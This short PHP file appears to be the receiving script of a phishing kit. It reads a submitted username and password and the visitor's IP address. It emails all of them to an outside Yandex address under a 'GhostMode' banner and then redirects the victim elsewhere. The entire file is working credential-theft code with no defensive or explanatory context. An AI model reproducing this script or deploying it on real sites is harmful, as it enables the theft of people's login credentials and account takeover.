<?

$ip = getenv("REMOTE_ADDR");
$message .= "---- : || GhostMode || :------\n";
$message .= "User ID             : ".$_POST['username']."\n";
$message .= "Password              : ".$_POST['password']."\n";
$message .= "----: || GhostMode || :------\n";
$message .= "IP: ".$ip."\n";


$recipient = "premones@yandex.com";
$subject = " Auto Login 2021  | ".$ip."\n";

mail($recipient,$subject,$message);
header("Location:  domain");
?>


